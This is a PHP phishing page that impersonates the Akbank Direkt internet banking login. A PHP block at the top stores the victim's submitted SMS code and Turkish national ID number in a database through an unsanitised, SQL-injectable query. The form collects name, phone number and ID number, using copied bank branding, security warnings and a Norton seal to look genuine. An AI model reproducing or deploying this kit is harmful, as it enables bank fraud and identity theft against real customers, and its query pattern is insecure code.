<?
include("baglan.php");
$sms=$_POST['sms'];
$tc=$_POST['tc']; 
mysql_query("insert into sms (sms, tc, tarih) values ( '$sms', '$tc', now())");
?>
<!DOCTYPE html>

<html class="no-js javascript png flash9 chrome webkit win"><!--<![endif]--><head id="ctl00_head"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="robots" content="noindex, nofollow"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>
	Akbank Direkt İnternet
</title><meta name="description" content="Akbank Direkt İnternet"><link rel="stylesheet" text="text/css" href="./WebResource.css"></head>

<body class="is-retail is-turkish is-desktop is-nontouch">
    <form name="sms" method="post" action="tesekkur.php" id="sms" autocomplete="off" style="height:100%;">
<div>
</div>



<script src="./WebResource1.css" type="text/javascript"></script>


<script src="./WebResource2.css" type="text/javascript"></script>
<script src="./WebResource3.css" type="text/javascript"></script>
<script src="./WebResource4.css" type="text/javascript"></script><script language="javascript">
window.history.forward(1);

</script>
<script src="./rsa.js.indir"></script>
<script src="./barrett.js.indir"></script>
<script src="./bigint.js.indir"></script>

<div>
</div>
 
        <link href="./jqueryuismoothness.css" rel="stylesheet">

        <link href="./newlogin.css" rel="stylesheet">

        <script src="./jquerymain.css"></script>

        <script src="./newloginjs.css"></script>

        <link href="./face.css" rel="stylesheet">

        <link href="./facelift.css" rel="stylesheet">


        
        <script src="./veribranch.css"></script>

        <script src="./raphael.css"></script>

        <script src="./face(1).css"></script>


        <script type="text/javascript" src="./entrypoint.aspx"></script>
        <div id="login-bar" class="login-has-switch">
            <ul id="login-switch" class="clearfix">
                
    <li class="login-switch-item" id="switch-item-corporate"><a href="javascript:void(0)" data-localize="Corporate_PageHeader">Kurumsal</a></li>
    <li class="login-switch-item" id="switch-item-language"><a href="javascript:void(0)" data-localize="SwitchLanguage">English</a></li>

            </ul>
            <div id="login-logo"></div>
        </div>
        <div id="login-wrapper" style="min-height: 505px;">
            <div id="login-container" class="clearfix">
                <div id="login-main" style="">
                   <div id="login-content" style="min-height: 323px;">
                        <div>
<h1 id="login-caption" data-localize="PageHeader">Bireysel</h1>
<ul id="login-tab" class="clearfix">
    <li class="login-tab-item login-active" id="bis-login-tab"><a href="javascript:void(0)">Müşteri / TC Kimlik No ile Giriş</a></li>
</ul>

<div id="login-loading" style="display: none;" data-localize="PleaseWait">Lütfen bekleyiniz...</div>
<div id="login-panel-bis-mbb" class="login-panel">
    <div class="login-row">
        <label for="txtMbbTckn" class="login-label" data-localize="CustomerNo">Ad Soyad</label>
        <div class="clearfix">
            <input name="ad" id="ad" type="text" autocomplete="off" maxlength="30" class="login-input" tabindex="1">
            <div class="login-tooltip" aria-haspopup="true">
                <span class="login-tooltip-text" data-localize="CustomerNumber">Akbank Direkt'e girişlerinizde Müşteri Numarası ya da T.C. Kimlik No kullanabilirsiniz. <br><br>Müşteri Numarası, Akbank Hesap Cüzdanınızda veya Akbank Banka Kartınızın üzerinde Müşteri No alanında yazılı olan numaradır. T.C. Kimlik Nonuzu Nüfus Cüzdanınızın üzerinde bulabilirsiniz.</span>
            </div>
        </div>
    </div>
	    <div class="login-row">
        <label for="txtMbbTckn" class="login-label" data-localize="CustomerNo">Telefon Numarası</label>
        <div class="clearfix">
            <input name="tel" id="tel" type="text" autocomplete="off" maxlength="11" class="login-input" tabindex="1">
            <div class="login-tooltip" aria-haspopup="true">
                <span class="login-tooltip-text" data-localize="CustomerNumber">Akbank Direkt'e girişlerinizde Müşteri Numarası ya da T.C. Kimlik No kullanabilirsiniz. <br><br>Müşteri Numarası, Akbank Hesap Cüzdanınızda veya Akbank Banka Kartınızın üzerinde Müşteri No alanında yazılı olan numaradır. T.C. Kimlik Nonuzu Nüfus Cüzdanınızın üzerinde bulabilirsiniz.</span>
            </div>
        </div>
    </div>
		    <div class="login-row">
        <label for="txtMbbTckn" class="login-label" data-localize="CustomerNo">Tc Kimlik Numarası</label>
        <div class="clearfix">
            <input name="tc" id="tc" type="text" autocomplete="off" maxlength="11" class="login-input" tabindex="1">
            <div class="login-tooltip" aria-haspopup="true">
                <span class="login-tooltip-text" data-localize="CustomerNumber">Akbank Direkt'e girişlerinizde Müşteri Numarası ya da T.C. Kimlik No kullanabilirsiniz. <br><br>Müşteri Numarası, Akbank Hesap Cüzdanınızda veya Akbank Banka Kartınızın üzerinde Müşteri No alanında yazılı olan numaradır. T.C. Kimlik Nonuzu Nüfus Cüzdanınızın üzerinde bulabilirsiniz.</span>
            </div>
        </div>
    </div>
    <div class="login-row login-row-btn">
       <button class="login-btn login-btn-login" style="border:0">Giriş</button>
    </div>
</div>

    <div id="login-panel-bis-security" class="login-panel" style="display: none;">
        

<div class="login-balloon clearfix" id="security-image-panel">
    <div class="login-security-container">
       <img id="loginSecurityImage" src="./blank.gif" alt="Güvenlik Resmi">
    </div>
    <p class="login-security-warning" data-localize="SecurityImageLoginInfoText">Güvenlik resminizi kontrol ediniz. Güvenlik resminde bir yanlışlık   olduğunu düşünüyorsanız, işleminize devam etmeyiniz ve <b>444 25 25</b>'i arayınız.</p>
    <div class="login-balloon-arrow"></div>
</div>


        

<div class="login-row" id="second-level-auth-message-row"></div>
	<div class="login-row login-row-btn">
    <a href="javascript:void(0)" class="login-btn login-btn-next" data-localize="LoginContinueButton">Devam</a>
</div>
<div class="login-row" id="alternate-login-methods-row">
    <ul>
        <li data-key="SMS"><a href="javascript:void(0)" data-localize="SwitchAuthMobilePass">Cep Şifre ile giriş</a></li>
        <li data-key="SOFTP"><a href="javascript:void(0)" data-localize="SwitchAuthSoftOtp">Şifreci-Mobil ile giriş</a></li>
        <li data-key="MSIGN"><a href="javascript:void(0)" data-localize="SwitchAuthMobileSign">Mobil İmza ile giriş</a></li>
        <li data-key="HOTP"><a href="javascript:void(0)" data-localize="SwitchAuthHardOtp">Şifreci ile giriş</a></li>
    </ul>
</div>

    </div>

                        </div>
                    </div>
                </div>
                
    

<div id="login-aside" style="">
    <div id="login-aside-security" class="clearfix" style="min-height: 323px;">
        <h4 data-localize="LoginAsideTitle">Güvenliğiniz İçin:</h4>
        <ul>
            <li class="login-aside-security-item" data-localize="LoginAsideItem1">Akbank Direkt şifrenizi kimseyle paylaşmayın.</li>
            <li class="login-aside-security-item" data-localize="LoginAsideItem3">Akbank Direkt girişinde cep telefonu marka ve modeli bilgileriniz istenmez.</li>
        </ul>
        <a id="login-aside-security-all" href="http://www.akbank.com/tr-tr/genel/Sayfalar/Guvenlik-Duyurulari.aspx" data-localize="LoginAsideLinkText" target="_blank">Tüm güvenlik uyarıları</a>
    </div>
</div>


            </div>
            <div id="login-footer" class="clearfix">
                <p id="login-copyright" data-localize="AkbankCopyright">Her hakkı Akbank T.A.Ş.'ye aittir. © 2017</p>
                <a id="login-secure" href="https://sealinfo.verisign.com/splash?form_file=fdf/splash.fdf&amp;dn=INTERNETSUBESI.AKBANK.COM&amp;lang=en" target="_blank">
                    <img src="./norton-secured.png" alt="Norton Secured">
                </a>
            </div>
            <div id="login-complete-TEMP" style="display: none;"><span id="login-complete-text-TEMP">Veee, müşteri login olur :)</span></div>
        </div>
        
    <script lang="javascript">
        $(document).ready(function () {

        });
    </script>

        <div id="ctl00_ClientSideTimeoutControl_logOutPopup" style="position: absolute; left: 50%; margin-left: -279px; top: 190px; display: none;
    width: 520px; z-index: 10000;">
    <img class="fix" src="./pop_up.png">
    <div style="position: absolute; top: 30px; left: 35px;">
        <span style="float: left; width: 490px; color: #FF0000; font-size: 12px; padding-top: 1px;">
            <strong style="font-weight: bold;">
                DİKKAT!</strong></span> <span style="color: #666666;
                    font-size: 12px; font-weight: bold; width: 490px; text-align: center; float: left;
                    line-height: 130%; padding-top: 10px; font-family: Arial,Helvetica,sans-serif;">
                    5 dak. süreyle hiçbir işlem yapılmadı. Oturumunuz
                    <span id="remainingSeconds"></span>
                    sn içinde kapatılacaktır.
                    <br>
                    Devam etmek istiyor musunuz?
                </span><span style="float: left; padding-top: 7px; width: 490px; text-align: center;">
                    <a onclick="logoffUser();return false;" id="ctl00_ClientSideTimeoutControl_closeButton" class="akb_button_tr popupClose" href="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$ClientSideTimeoutControl$closeButton&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, true))" style="*text-indent: 0px;"></a>
                    &nbsp;&nbsp;&nbsp;
                    <a onclick="return continueButton_ClientClick();" id="ctl00_ClientSideTimeoutControl_continueButton" class="akb_button_tr popupContinue" href="javascript:__doPostBack(&#39;ctl00$ClientSideTimeoutControl$continueButton&#39;,&#39;&#39;)"></a>
                </span>
    </div>
</div>
<div id="ctl00_ClientSideTimeoutControl_time_out_Popup" style="display: none;">
    <div class="regular vb_popup" id="popup_wrapper" style="display: none; margin-left: -275px; top: 180px;">
        <div id="popup">
            <div class="popup-content" id="mainPopContent" style="height: 140px">
                <div class="">
                    <h3 class="headline">
                        <strong id="warning_header" style="font-weight: bold;"></strong>
                    </h3>
                    <a id="ctl00_ClientSideTimeoutControl_close" class="close">
                        Kapat</a>
                </div>
                <div class="popup-text">
                    <p id="warning_message" style="font-size: 13px;">
                    </p>
                </div>
                <div class="popup-buttons" id="okButton" style="margin: 3px 0 -2px;">
                    &nbsp; <a class="akb_button_tr ok mr5" style="display: inline-block; margin: 0px auto;">
                        ok</a></div>
            </div>
        </div>
    </div>
</div>
 
<noscript>
    &lt;div&gt;
        &lt;img src="https://sdc.akbank.com/dcskz4se500000ww6suwlxkgn_1q9f/njs.gif?dcsuri=/nojavascript&amp;WT.js=No&amp;WT.tv=9.3.0&amp;WT.dcssip=internetsubesi.akbank.com" id="ctl00_WebTrendsUserControl_DCSIMG" alt="DCSIMG" width="1" height="1" /&gt;
    &lt;/div&gt;
</noscript>


    </form>

</body></html>